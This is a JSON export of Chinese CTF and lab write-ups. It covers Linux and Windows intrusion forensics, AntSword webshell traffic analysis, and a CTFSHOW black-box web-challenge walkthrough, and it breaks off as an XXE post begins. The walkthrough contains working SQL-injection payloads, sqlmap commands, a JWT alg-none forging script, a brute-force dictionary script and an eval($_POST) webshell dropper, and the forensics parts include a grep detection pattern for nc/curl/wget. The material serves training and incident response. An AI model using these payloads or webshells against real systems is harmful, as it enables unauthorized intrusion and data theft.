{"posts":[{"title":"玄机靶场 | blueteam的小心思","text":"前言玄机靶场日常刷题记录，练练手 索引 玄机题目步骤#1攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。 在根目录发现wireshark.pcap文件，可以用wireshark进行流量分析 将文件通过SFTP传到本地，过滤出http流量 一个一个分析，发现可疑流量，直接得到账号密码 md5加密得 1flag{d63edb0e9df4cf411398e3658c0237e0} 步骤#2攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串”upload.php”的小写md5值，格式flag{md5}。 继续往下分析，发现可疑流量 发现这里上传了一个zip压缩包，追踪TCP流 发现一句话木马，确定攻击者是通过该页面上传木马文件，加密pluginmgr.php字符得到 1flag{b05c0be368ffa72e6cb2df7e1e1b27be} 步骤#3找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag{md5}。 直接查找关键字 1grep -r --include=&quot;*.php&quot; 'eval($_POST' / 加密文件得到flag 1flag{a097b773ced57bb7d51c6719fe8fe5f5} 步骤#4攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。 继续分析流量，发现可疑流量 发现这个木马文件在尝试下载一个文件，直接搜索这个文件 1find / -name &quot;is.world&quot; 这里有个坑，不能直接加密文件，要用引号括起来再加密，不然中间的空格会分隔指令 1md5sum &quot;/var/www/html/plugins/. /is.world&quot; 得到flag 1flag{ee279c39bf3dcb225093bdbafeb9a439} 步骤#5攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag{md5}。 查看用户列表 1cat /etc/passwd 发现有个用户的用户ID和组ID都为0，权限很高，一般情况下只有管理员的UID和GID为0，说明这个是后门用户，直接加密得到flag 1flag{4cda3461543c9a770a3349760594facd} 步骤#6攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。 一般这种情况是修改了shell配置文件，常见的配置文件包括 123456789101112用户级别1、&quot;~/.bashrc&quot; 用于配置非登录 Shell 的环境（例如桌面终端）, 每次启动新的非登录 Shell 时加载2、&quot;~/.bash_profile&quot; 用于配置 登录 Shell 的环境, 每次登录（例如通过 SSH 或控制台登录系统）3、&quot;~/.profile&quot; 用于配置 登录 Shell 环境变量, 在用户登录时执行4、&quot;~/.zshrc&quot; 每次启动 Z Shell 的非登录会话时加载5、&quot;~/.bash_logout&quot; 在用户退出登录 Shell 时执行系统级别1、&quot;/etc/profile&quot; 用于设置所有用户的登录 Shell 环境变量, 所有用户登录时加载2、&quot;/etc/bash.bashrc&quot; 提供全局的非登录 Shell 配置, 每次启动新的非登录 Shell 时加载3、&quot;/etc/profile.d/*.sh&quot; 当 /etc/profile 加载时, 会依次加载 /etc/profile.d 中的所有脚本文件（通常是 .sh 文件）4、&quot;/etc/environment&quot; 用于配置系统范围的环境变量, 在用户登录前加载，影响所有用户和守护进程 一般情况执行顺序，可以用作参考 12345678910111.登录 Shell 系统级配置文件： /etc/profile /etc/profile.d/*.sh 用户级配置文件： ~/.bash_profile（如果不存在，则加载 ~/.profile）2.非登录 Shell 系统级配置文件： /etc/bash.bashrc（如果系统支持） 用户级配置文件： ~/.bashrc 这里一个一个尝试即可，发现/etc/profile有问题 直接md5sum加密得到flag 12md5sum /etc/profile#flag{65bf3e4a9ac90d75ec28be0317775618} 步骤#7攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。 搜索后门触发命令，这里搜索的是用户目录下的可疑配置文件 1grep -r -E '(nc|curl|wget|bash|python|eval|base64)' ~/ 发现有个配置文件尝试外联恶意网址 直接加密得到flag 1flag{4acc9c465eeeb139c194893ec0a8bcbc} 步骤#8攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag{md5}。 确定数据库类型 1systemctl list-units --type=service | grep -E '(mysql|mariadb|postgresql|mongodb|redis)' 查看数据库的登录信息，一般放在配置文件“config.inc.php”里面 1find / -name config.inc.php 得到数据库账号密码，用 Premium连接，一个一个尝试，发现有个数据库无法查看，说明被加密了，这里用的大佬的图 查找对应文件，可以得到文件所在路径 1find / -name JPMorgan@0020Chase 加密文件夹名得到flag 1flag{0928a5424aa6126e5923980ca103560e} 步骤#9解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。 查看mysql文件夹，发现有个可疑文件 直接抓取内容看看，发现是个加密脚本 这里要写一个逆推脚本，参考网上的文章 123456789101112131415&lt;?php $currentDate = date(&quot;Y-m-d&quot;); $key = md5('2023-11-18'); $iv = substr(hash('sha256', &quot;DeepMountainsGD&quot;), 0, 16); $filePath = &quot;/var/lib/mysql/JPMorgan@0020Chase&quot;; $files = scandir($filePath); foreach ($files as $file) { if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) { $fullPath = $filePath . '/' . $file; $encryptedContent = file_get_contents($fullPath); $decryptedContent = openssl_decrypt($encryptedContent, 'aes-256-cbc', $key, 0, $iv); file_put_contents($fullPath, $decryptedContent); } } ?&gt; 这里的时间是JPMorgan@0020Chase的创建时间 1stat JPMorgan@0020Chase #查看详细信息 把脚本写进/var/www/mysql/目录 1vim 1.php 先按i插入代码，然后按一下Esc，再按住shift + :，然后输入wq保存 运行代码 1php 1.php 重启数据库 1systemctl restart mysql 这时再返回Premium，可以发现数据库解密了，Harper用户对应Areer为Chef，加密即可 1flag{8fd82b8864d71ed7fa12b59e6e34cd1c} 步骤#10因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。 这里攻击者用到提权，可以查找以 root 用户身份拥有并设置了 SUID（Set User ID）权限的文件。 1find / -user root -perm -4000 2&gt;/dev/null #4000 代表文件权限中的 SUID 位。 当一个文件被设置了 SUID 位，并且用户执行该文件时，该程序会以文件拥有者（通常是 root）的权限运行，而不是以当前用户的权限运行 发现/usr/bin/sudo，sudo 被广泛用于权限提升，估计攻击者通过这个提权，/etc/sudoers 包含了系统上 sudo 的配置和权限设置，这里抓取内容看一下 1cat /etc/sudoers www-data用户被赋予了root权限，而且不需要输入密码，到这里已经可以确认漏洞配置了，就是/etc/sudoers ，加密文件得到flag 1flag{6585817513b0ea96707ebb0d04d6aeff} 参考特别鸣谢 Peterpan.exe：https://blog.csdn.net/administratorlws/article/details/140471298","link":"/posts/Xuanji-CTF-Blue-Team-Forensics/"},{"title":"玄机靶场 | 蚁剑流量分析","text":"什么是蚁剑蚁剑（AntSword）是一款开源的网络安全工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员，常用于网络渗透测试，可以远程连接被攻击的计算机，进行文件上传下载、执行系统命令等操作 蚁剑下载地址：https://github.com/AntSwordProject/antSword 蚁剑流量特征每个请求体通常以@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);开头 请求体包含base64编码内容 响应包一般是明文，但也可能存在加密情况，结果通常为随机字符和返回结果 Content-Type通常为 application/x-www-form-urlencoded，表明数据是以标准表单形式编码的 索引 玄机题目步骤#1木马的连接密码是多少 首先输入http筛选出http协议流量包，这些内容就是我们要分析的流量了 随便点开一个请求的内容，例如第一个请求包，观察发包内容 这里面的key就是木马的连接密码，为“1” 1flag{1} 步骤#2黑客执行的第一个命令是什么 点开第一个流量包，查看请求内容，选择最后一个item的value值，点击“显示分组字节流” 因为是base64编码，因此需要在左下选择Base64解码，由于蚁剑的特征，前两位是随机值，所以开始位置调整为“2”，成功得到执行命令 结合响应内容可知，第一个执行的命令为id，为什么不是cd &quot;/var/www/html&quot;呢，因为这是蚁剑自动执行的，表示攻击者是在/var/www/html执行命令的 1flag{id} 步骤#3黑客读取了哪个文件的内容，提交文件绝对路径 分析到第三个响应包时，发现返回内容为/etc/passwd 查看第三个请求包，方法跟步骤2一样，也是点开“显示分组字节流”，调整开始位置为“2”，解码为“Base64”，可以看到执行了命令cat /etc/passwd，因此答案就是这个 1flag{/etc/passwd} 步骤#4黑客上传了什么文件到服务器，提交文件名 分析到第四个响应包时，发现返回内容很短，跟其他流量包的内容差距较大，可以猜测出这是文件上传后的响应内容 跟之前一样，我们看看第四个请求包内容，解码可以得到上传的文件名 1flag{flag.txt} 步骤#5黑客上传的文件内容是什么 分析第四个请求包，可以发现编码内容跟其他流量包有较大差距，由于蚁剑上传的文件会对内容进行16进制编码，因此我们对其进行解码查看 解码选择“Hex Digits”，其他不用变，成功得到文件内容 1flag{write_flag} 步骤#6黑客下载了哪个文件，提交文件绝对路径 分析第六个响应包，可以看到这是一个文件的返回内容 通过分析，这六个HTTP事务（一次完整的请求+响应）里面，前三个是执行系统命令的，后三个则是执行文件上传下载浏览操作的 其中第四个我们已经证实是文件上传，那第五个是什么呢？通过对请求包进行解码，得到内容是/var/www/html/7，这是蚁剑自动执行的，实际上攻击者应该是点开了蚁剑的文件管理功能，然后回显为 显示的是/var/www/html里面的内容，因此第五个事务并不是下载文件，而是浏览目录 最后看第六个请求包的内容，步骤跟之前一样，得到 结合前面的返回内容，因此第六个请求包反应的就是黑客下载的文件 1flag{/var/www/html/config.php} 总结1.前三个事务反应的是执行系统命令，后三个事务反应的是文件上传下载浏览等操作，通过对前三个请求包解码可以看到 /bin/sh 是指向系统标准shell的路径，用于进行交互，也就是执行系统命令，而后三个事务没有 2.攻击者的完整行为： 12345671.攻击者首先通过蚁剑连接webshell，文件名为1.php，连接密码为1，连接URL为http://192.168.200.54/1.php2.连接后双击打开了/var/www/html目录，点开虚拟终端，执行命令id和pwd3.接着执行ls和pwd，查看当前目录文件和所在目录4.执行cat /etc/passwd和pwd，查看/etc/passwd内容和当前目录5.上传文件flag.txt到/var/www/html，内容为flag{write_flag}6.攻击者点开文件管理功能查看/var/www/html目录7.在文件管理功能处攻击者下载了/var/www/html/config.php，获得网站配置文件 通过查看config.php文件，攻击者获得了目标网站数据库的敏感信息等 参考网安日记本：https://blog.csdn.net/haosha__demingzi/article/details/135816411","link":"/posts/Xuanji-CTF-AntSword-Traffic-Analysis/"},{"title":"玄机靶场 | Where-1S-tHe-Hacker","text":"前言我一开始用的是在线靶机，但是因为一些不可抗拒因素，具体参考步骤#11，所以最终把靶机下载到本地分析，同时也能省点金币，题目可以在划水但不摆烂公众号下载 题目下载地址：https://pan.baidu.com/s/1MwRbI6Cbz2j_hlHInVL1Bg?pwd=fmzu 服务器账号密码 admin Aa123456 注：样本请勿在本地运行 索引 玄机题目步骤#1找到黑客ID 为多少,将黑客ID 作为 FLAG 提交; 打开网页根目录，发现index.php被挂了黑页，在文件内容里面找到黑客ID 1flag{X123567X} 步骤#2找到黑客在什么时间修改了网站主页,将黑客修改了网站主页的时间 作为 FLAG 提交（y-m-d-4:22:33）; 直接查看属性，找到修改时间 提交的时候有个问题，如果时间你是直接复制属性中的，提交时会显示错误，因为属性中的时间携带不可见字符，正确的做法是自己手打进去，具体可以看看010editor的分析 1flag{2023-11-6-4:55:13} 步骤#3找到黑客第一个webshell文件名是,将第一个webshell文件名 作为FLAG 提交; 可以用D盾，也可以手工排查，这里我选择手工排查 找到Apache目录下的访问日志 前面大量的HEAD表示的是黑客在进行目录扫描，可以不看，直接跳到后半部分扫描结束那里，通过排查，发现两个疑似webshell的可疑文件 去根目录下找到对应的文件，查看进行确认 发现两个都是黑客上传的webshell文件，按照时间顺序，第一个webshell文件名是SystemConfig.php 1flag{SystemConfig.php} 步骤#4找到黑客第二个webshell文件名是,将第二个webshell文件名 作为FLAG 提交; 同上，第二个webshell文件名是syscon.php 1flag{syscon.php} 步骤#5找到黑客第二个webshell的连接密码是,将第二个webshell的连接密码 作为FLAG 提交; 步骤三那里可以得到第二个webshell的连接密码是pass 1flag{pass} 步骤#6找到黑客新建的隐藏账户,将新建的隐藏账户名字 作为FLAG 提交; 有很多方法可以实现，这里选择注册表查看 win+r然后输入regedit打开注册表编辑器，找到HKEY_LOCAL_MACHINE\\SAM\\SAM，但是这里不能直接查看，我们右键点击SAM，赋予完全控制权限 然后重新打开注册表，进入HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names，找到当前计算机全部用户，发现隐藏用户为admin$ 有时候攻击者可能不会直接新增隐藏用户，而是通过修改Guest用户注册表对应的F值（权限分配）与本地管理Administrator的权限相同，相当于克隆了Administrator，这也需要我们额外注意 还有一个方法，就是直接在此电脑那里查看，更快速，但是平时的话还是建议用注册表来分析，更加精准 1flag{admin$} 步骤#7找到黑客隐藏账户创建时间是,将隐藏账户创建时间是 作为FLAG 提交（答案格式：2024/12/3 9:16:23）; 直接cmd打开，输入net user admin$查看账户详细信息 1flag{2023/11/6 4:45:34} 步骤#8找到黑客添加隐藏账户进管理员组的时间,将添加隐藏账户进管理员组的时间 作为FLAG 提交（答案格式：2024/12/3 9:16:23）; 这里要用到系统事件分析，按Win+R键输入eventvwr.msc打开事件查看器 常见事件ID类型 12345678910111213144624 登录成功4625 登录失败，如果有人尝试破解系统密码，可以看到大量连续登录失败信息4726 删除用户4722 账号启用4725 账号禁用4723 修改密码4724 重置密码4634 注销成功4647 用户启动的注销4672 管理员登录4720 创建用户，使用系统漏洞攻击成功后，往往会创建一个用户，方便远程登录4732 加入安全组，常见于将新用户加入管理员组4733 移除出安全组4684 通过登陆界面登陆的 这里我们筛选4732，时间的话我们根据admin$的创建时间，选择2023/11/6 4:45:00开始，结束时间随便，可以选小点缩小范围 一个个点进去查看，找到添加到管理员组的事件 注意时间格式 1flag{2023/11/6 4:46:07} 步骤#9找到黑客在什么时间从文件中读取保留的密钥,将读取保留的密钥的时间 作为FLAG 提交（答案格式：2024/12/3 9:16:23）; 这里我们聚焦于两个事件ID 125051 将保留的密钥写入文件5058 从文件中读取保留的密钥 也是通过事件查看器去找，时间我这里选择不变 也是按时间顺序找就行 注意时间格式 1flag{2023/11/6 4:46:58} 步骤#10找到黑客通过隐藏账户通过(PTH)哈希传递攻击登录的时间是,将(PTH)哈希传递攻击登录的时间 作为FLAG 提交; 哈希传递攻击指的是攻击者无需知道用户的明文密码，只需窃取密码的哈希值（Hash），就能冒充该用户登录到网络中的其他系统。 这里我们聚焦于NtLmSsp（NT LAN Manager Security Support Provider），它用于处理 NTLM 协议的身份验证，我们去筛选登录事件，找到登录进程为NtLmSsp的即可，对应的事件ID为4624 按照时间顺序一个个筛选 注意时间格式 1flag{2023/11/6 4:47:28} 步骤#11找到黑客上传的两个CobaltStrike木马文件名,将上传的两个CobaltStrike木马文件名 作为FLAG 提交（答案格式：”A.exe,B.exe”）; 这里用绿盟D-Eyes主机命令行应急工具，将工具上传到目标机器，cmd输入D-Eyes fs扫盘 如果是多盘路径可以用D-Eyes fs -P C:\\\\,D:\\\\tmp,D:\\\\tools，也可以用D-Eyes.exe ps进行进程扫描，排查异常进程信息 这里我们就使用D-Eyes fs扫盘 这里只找到之前的webshell文件，并没有找到cs可疑文件，原因是部分文件被Windows Defender自动隔离了，需要从隔离区恢复 这里有个问题，如果用的是玄机靶场的话，已隔离威胁那里是找不到这些被隔离的文件，估计是那边默认给删除了，然后没被工作人员发现 所以我用的是下载来的靶场，还原文件之后再扫一遍，排查可疑文件，发现多了两个文件 把SystemTemp.exe和SysnomT.exe放进安恒云沙箱检测（拉取文件到本地之后不要运行） 可以看到这两个文件都是cs控制程序 1flag{SystemTemp.exe,SysnomT.exe} 靶机内部题目答案这是靶机内部答题.exe的答案，不是玄机靶场的答案，玄机的答案在上面各小点里 1234567891011X123567X2023‎年‎11‎月‎6‎日，‏‎4:55:13SystemConfig.phpsyscon.phppassadmin$2023/11/6 4:45:342023/11/6 4:46:072023/11/6 4:46:582023/11/6 4:47:28SystemTemp.exe和SysnomT.exe 参考特别鸣谢 划水但不摆烂：https://mp.weixin.qq.com/s/4UoIw-On-0taB8s0xtjkAw Peterpan.exe：https://blog.csdn.net/administratorlws/article/details/141672688","link":"/posts/Xuanji-CTF-Where-1S-tHe-Hacker/"},{"title":"玄机靶场 | Where-1S-tHe-Hacker-P2","text":"前言靶机可以用玄机的，也可以在公众号下载，这里我选择用自己下载的，感谢划水但不摆烂提供的资源 题目下载地址：https://pan.baidu.com/s/14OPvxDgsEsY-O3e34K2FUw?pwd=2024 划水应急工具包：https://pan.baidu.com/s/1dwBMRQO3TUEMx8FWVeJLew?pwd=ltja 服务器账号密码 admin Aa123456 进去后运行phpstudy开启相关服务 因为玄机的题目是从靶机内部题目挑选的，不完整，因此本文分两部分 索引 玄机题目步骤#1最早的WebShell落地时间是（时间格式统一为：2022/12/12/2:22:22）; 上传D盾到目标机器，把C:\\phpstudy_pro\\WWW目录放入D盾扫描 发现大量WebShell文件，点进去C:\\phpstudy_pro\\WWW\\attachment\\php\\2023\\11，按时间排序，找到最早的WebShell落地时间即可 1flag{2023/11/11/0:30:07} 步骤#2黑客最早的WebShell密码是多少，将WebShell密码作为Flag值提交； 用记事本打开WebShell文件，找到连接密码 1flag{pass} 步骤#3CobaltStrike木马被添加进计划任务的时间是 win+r输入taskschd.msc打开任务计划程序，找到\\Microsoft\\Windows\\AppID\\，查看计划任务，发现有个可疑任务，在每天9:50自动触发，查看启动程序 但是这个huorong.exe我怎么找都找不到，网上百度了一下，发现别人也找不到，最后查看官方WP确定了这是个木马文件，但是不知道什么原因找不到了 然后我们导出该文件，用浏览器打开 成功得到CobaltStrike木马文件的修改时间 1flag{2023/11/15/8:02:20} 步骤#4黑客启用并添加进管理员组的用户与时间是 答案格式：Username,2022/12/12/2:22:22）； 用D盾检测用户账号，发现Guest被启用并添加进管理员组 cmd打开输入net user guest查看guest的修改时间 1flag{guest,2023/11/11/0:45:59} 步骤#5攻击者使用弱口令登录ftp的时间是 打开C:\\phpstudy_pro\\Extensions\\FTP0.9.60\\Logs查看FTP的登录日志 总共三个，一个个点进去看看，发现第二个有问题 成功得到攻击者登录ftp的时间 1flag{2023/11/11/1:08:54} 步骤#6攻击者使用弱口令登录web管理员的时间是 这里我们主要审计Apache的日志，打开C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs，审计access.log.1700006400 题目问的是攻击者使用弱口令登录web管理员的时间，我们可以尝试用弱口令自己爆破网站，然后抓取登录成功的包，在日志里面进行匹配，就可以找到攻击者的登录时间 打开浏览器输入127.0.0.1/index.php，然后点击上一级，回到首页 用弱口令字典爆破即可，不限方法，爆破得到账号为admin，密码为123456，然后登录抓包 重新回到日志，ctrl+f搜索index.php?mod=site&amp;act=manager&amp;do=main&amp;beid=1 成功得到攻击者登录后台管理页面的时间 如果你不想爆破网站，直接分析日志也可以，一般情况下登录成功会有302跳转，我们可以直接筛选302跳转，并根据日志特征进行匹配 可以看到URI里面包含manager，通过上下文分析，可以确定这是登录成功的跳转页面，不过想更精确的话还是第一种方法好 1flag{2023/11/15/7:38:31} 靶机内部题目（除去相同题目）步骤#7CobaltStrike远程控制木马的文件名与落地时间是？（答案格式：ABC.exe,2022/12/12/2:22:22） 这题我用绿盟D-Eyes扫了很久都没扫出来，在安全中心的隔离区也没找到，不知道什么原因，查找计划任务里面的木马路径也没有 一般情况下遇到这种题目，我们用安全工具扫描就可以，例如火绒、绿盟D-Eyes等，但是这里不知道为什么电脑找不到这个木马 这里直接给出官方的答案 1huorong.exe,2023/11/15/7:45:47 步骤#8攻击者查看上传回显路径的时间是？ 攻击者上传木马之后，需要知道文件被上传到哪里，这时我们从攻击者登录后台管理员账号的时间之后开始审计日志 这里可以看到，在一大波注入攻击之后出现一个文件查询的URI，猜测是显示文件路径的，我们粘贴到网页执行（先登录网站） 这些参数的URL就是木马文件路径，可以尝试蚁剑连接验证 确定是木马文件，成功得到攻击者查看上传回显路径的时间 12023/11/15/7:38:53 步骤#9第二批WebShell的最早上传时间是？ 前面我们知道了木马的回显路径，因此可以在该路径上进行分析，打开C:\\phpstudy_pro\\WWW\\attachment\\2023\\11，然后按时间排序，可以看到木马的上传时间分两个时间段，一些是2023/11/11，另一些是2023/11/15 打开15号最早的文件验证，确定是木马文件 右键打开属性，获取具体时间 当然如果想稳妥的话还是分析日志文件好，打开C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs\\access.log.1700006400，筛选出状态码为200的日志记录进行分析 可以看到这里攻击者采用了SSRF攻击，通过在inc_config.php写入木马，让网站去fetch这个文件并保存在本地，然后通过webshell连接并控制网站，因此第二批WebShell的最早上传时间就是这个 12023/11/15/7:40:10 步骤#10根据上题线索，WebShell开始通信的时间是？ 沿着上面的日志记录继续往下分析，发现可疑记录 可以看到发送POST请求，与木马文件进行交互，打开文件验证一下 因此WebShell开始通信的时间就是这个 12023/11/15/7:42:36 靶机内部题目答案这是靶机内部答题.exe的答案 参考特别鸣谢 划水但不摆烂：https://mp.weixin.qq.com/s/4PQ5TaBUUpW_9hkm-kue1Q","link":"/posts/Xuanji-CTF-Where-1S-tHe-Hacker-P2/"},{"title":"CTFSHOW | 黑盒测试 web380 - web395","text":"什么是黑盒测试黑盒测试（Black-Box Testing）是一种软件测试方法，测试人员在完全不了解程序内部结构和源代码的情况下，对程序的功能进行测试。测试人员就像普通用户一样，只能通过程序的输入（如点击链接、在输入框中填写数据）来观察其输出，以此判断程序是否存在问题 黑盒测试一般思路在进行黑盒测试时，通常会遵循一个系统性的流程，大致可以分为以下几个关键步骤： 1. 信息收集 (Reconnaissance) 这是所有测试的第一步，目的是尽可能多地了解目标，发现所有可能的攻击入口 目录/文件扫描：使用工具扫描网站可能存在的隐藏目录和文件，如后台登录页面、功能性文件、源码备份等。 前端代码分析：查看网页的HTML、CSS和JavaScript源码（浏览器F12或Ctrl+U），从中寻找隐藏的路径、注释、API接口等。 技术栈识别：通过HTTP响应头、错误信息、网页页脚等判断网站使用的技术（如Apache、Nginx等），有助于我们选择更具针对性的测试方法。 2. 漏洞发现 (Vulnerability Analysis) 收集到足够的信息后，就可以对发现的各个功能点和入口点进行漏洞测试 输入点测试：对所有用户可以输入数据的地方（如URL参数、搜索框、登录框）进行测试，寻找SQL注入、文件包含、命令执行等漏洞。 认证与授权测试：测试登录认证机制是否可以被绕过或破解，例如使用万能密码、暴力破解、伪造JWT等。 逻辑测试：测试应用程序的业务逻辑是否存在缺陷，例如密码重置功能是否可以被滥用、支付流程是否可以被绕过等。 3. 漏洞利用 (Exploitation) 在确认漏洞存在后，构造特定的Payload来利用这个漏洞，以达到我们的最终目的。在CTF中，这个目的通常是读取服务器上的flag文件。在真实的渗透测试中，目的可能是获取服务器的控制权或窃取敏感数据等 题目列表web380扫描网站目录，发现存在两个文件路径 其中第一个大小为0B，可以不用管，直接看第二个路径/page.php 显示打开$id.php失败，我们尝试能不能控制这个参数，输入/page.php?id=1 发现存在文件包含漏洞，直接输入/page.php?id=flag，查看源码得到flag web381打开网站，查看网页源代码，发现相比上一题，这里多了个可疑路径 为了更直观地看到区别，这里把上一题的网页源码放出来 我们访问路径/alsckdfy，成功得到flag web382打开网站，查看网页源代码，跟上一题一样 继续访问路径/alsckdfy，这次打开了一个登录框 尝试用万能密码，成功登录，账号1' or 1=1 #，密码随便写，成功得到flag web383跟上题步骤一样，也是先访问路径/alsckdfy，打开登录框后输入万能密码得到flag web384跟之前一样，来到登录框这里，这次题目有提示，告诉我们密码前2位是小写字母，后三位是数字，很明显是要爆破 因此我们抓取登录的包来尝试爆破，账号用admin，密码可以根据题目要求生成一个字典，python脚本如下 123456789101112131415import stringimport itertoolsfilename = &quot;passwd.txt&quot;letters = string.ascii_lowercase # 小写字母 'abcdefghijklmnopqrstuvwxyz'digits = string.digits # 数字 '0123456789'with open(filename, 'w') as f: for letter_pair in itertools.product(letters, repeat=2): for digit_triplet in itertools.product(digits, repeat=3): password = &quot;&quot;.join(letter_pair) + &quot;&quot;.join(digit_triplet) f.write(password + '\\n')print(f&quot;密码字典生成完毕，已保存到 {filename} 文件中。&quot;) 然后插入到密码处爆破即可，我这里用的yakit，如果是burpsuite同理 最后爆破出来密码是xy123，成功得到flag web385跟之前一样，来到登录框这里，但是这次万能密码不行，题目也没有提示，先尝试扫目录看看 发现有个路径/install，拼接进网站访问看看 然后访问/install/?install，发现成功将管理员密码重置为默认密码 因为不知道默认密码，因此我们尝试进行弱口令爆破 爆破得到密码为admin888，成功得到flag web386扫描目录 访问/install，但是这次显示lock.dat存在 这题相比上一题多了一个/clear.php，访问显示清理完成，我们尝试能不能控制它清理我们指定的文件，猜测参数可能为file，访问/clear.php?file=install/lock.dat，接着再次访问/install，发现lock.dat成功被删除 这时再访问/install/?install重置密码即可，其他步骤跟上题一样，密码依然是admin888，成功得到flag web387扫描目录 发现多了个/debug，访问看看 显示file not exist，猜测可以进行文件包含，输入/debug/?file=/etc/passwd 成功读取到文件，尝试进行日志包含执行命令，UA写入如下内容 1&lt;?php unlink('/var/www/html/install/lock.dat');?&gt; 再次访问/install，发现成功删除lock.dat 其他步骤跟之前一样，密码依然是admin888，成功得到flag web388访问路径/debug，输入/debug/?file=/etc/passwd，但是这次回显方式不一样 由于暂时没有可用的方法，因此我们对后台登录页面进行目录扫描 由前几道题可知，flag就存放在/alsckdfy/check.php里面，但是我们现在暂时没有权限去访问 扫描结果中我们发现路径/alsckdfy/editor/，访问后看到是一个编辑器 存在文件上传页面，我们可以尝试上传一句话木马进去 但是这里对文件上传后缀有限制 我们把木马写好后改后缀为zip，上传文件 1234&lt;?php$a = '&lt;?php eval($_POST[1]);?&gt;';file_put_contents('/var/www/html/1.php',$a);?&gt; 复制路径，然后拼接到/debug/?file=/var/www/html后面 访问路径/1.php，发现成功写入webshell 执行命令tac alsckdfy/check.php得到flag web389访问路径/debug，这次显示权限不足 F12查看cookie，发现多了一个auth验证 网页解密jwt，发现是加密验证，用c-jwt-cracker爆破得到密钥为123456，然后把sub那里的user改为admin 将token复制到auth那里，刷新网页，成功绕过权限限制 剩下的步骤跟上题一样，最后得到flag为 web390方法一（JWT伪造）： 访问路径/debug，依旧是显示权限不足，但是这次密钥爆破不出来了，因此换个方法，把alg改为none，sub改为admin，然后重新编码token，如果后端没有对算法进行验证，那么就可以成功绕过了 用python脚本实现，记得要先用自己jwt解码的payload复制替换dict，然后更改user为admin 123456789101112131415161718192021import jwt# 把自己的payload复制替换dict，然后更改user为admindict = { &quot;iss&quot;: &quot;admin&quot;, &quot;iat&quot;: 1753530361, &quot;exp&quot;: 1753537561, &quot;nbf&quot;: 1753530361, &quot;sub&quot;: &quot;admin&quot;, &quot;jti&quot;: &quot;2b4b35d9ec779539cc1d8c4c8b4659aa&quot;}headers = { &quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot; } jwt_token = jwt.encode(dict, key='',headers=headers, algorithm=&quot;none&quot;) print(jwt_token) 得到token后复制替换网页中的cookie，成功绕过限制 剩下的步骤跟web388一样，成功得到flag 方法二（数字型注入）： 在首页打开灯泡往事，发现有个id存在注入漏洞 输入单引号和双引号都没反应，经过测试，发现是数字型注入，输入page.php?id=-1 union select 1,2,3#，回显位置为2和3 接下来就是把alsckdfy/check.php的内容写到页面即可 1page.php?id=-1 union select 1,2,substr((select load_file('/var/www/html/alsckdfy/check.php')),1,255)# 然后查看网页源代码得到flag web391方法一（JWT伪造）： 上一题的解法依旧能用，跟之前一样，也是先绕过权限写入日志 然后利用webshell读取flag 方法二（字符型注入）： 在首页打开灯泡往事，发现多了一个标题输入框 经测试存在字符型注入，为单引号，且#被过滤，用-- -代替，回显位置为2和3 把alsckdfy/check.php的内容写到页面 1search.php?title=-1' union select 1,2,substr((select load_file('/var/www/html/alsckdfy/check.php')),1,255)-- - 查看网页源码即可得到flag web392方法一（JWT伪造）： 跟web390方法一样，不过这次flag位置改变了，不在alsckdfy/check.php里面 而是在根目录/flag里面 方法二（字符型注入）： 跟上题方法一样，不过要读取的文件改成了根目录/flag 1search.php?title=-1' union select 1,2,substr((select load_file('/flag')),1,255)-- - web393方法一（JWT伪造）： 跟上题方法一样，flag也是在根目录 方法二（堆叠注入）： 在首页最底下发现有个搜索引擎 点第一个百度，进去之后发现是百度的搜索页面 修改网页id值，又显示其他页面 因此可以判断这里存储的是网页链接，通过传入的id值查询数据库中的url并进行访问 同时测试发现/search.php?title=1存在堆叠注入，需要先获取数据库的表名和列名再利用，用sqlmap 获取数据库名 1python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET --dbs --batch 获取表名 1python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow --tables --batch 获取列名 1python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow -T link --columns --batch 接着利用堆叠注入插入数据 1search.php?title=1';insert into link(id, name, url) values(11,'a','file:///flag'); 最后访问/link.php?id=11即可 web394方法一（JWT伪造）： 跟web390方法一样，但是flag这次不在根目录/flag了，而是在网站目录的alsckdfy/check.php里面 方法二（堆叠注入）： 跟上题方法一样，但是这次过滤了一些字符，用16进制绕过即可 记得在前面加个0x表示16进制 12search.php?title=1';insert into link(id, name, url)values(10,'a',0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870); 最后访问/link.php?id=10即可 查看网页源代码 web395方法一（JWT伪造）： 解法跟上题一样 方法二（堆叠注入）： 解法也是跟上题一样 参考NaecoYes：https://blog.csdn.net/q20010619/article/details/120639310","link":"/posts/ctfshow-black-box-web380-web395/"},{"title":"CTFSHOW | XXE题解 web373 - web378","text":"什么是XMLXML，全称为可扩展标记语言（eXtensible Markup Language），设计宗旨是传输和存储数据 可以把它和HTML对比来理解： HTML 的标签（如&lt;h1&gt;, &lt;p&gt;）是预定义好的，主要功能是告诉浏览器如何显示内容。 XML 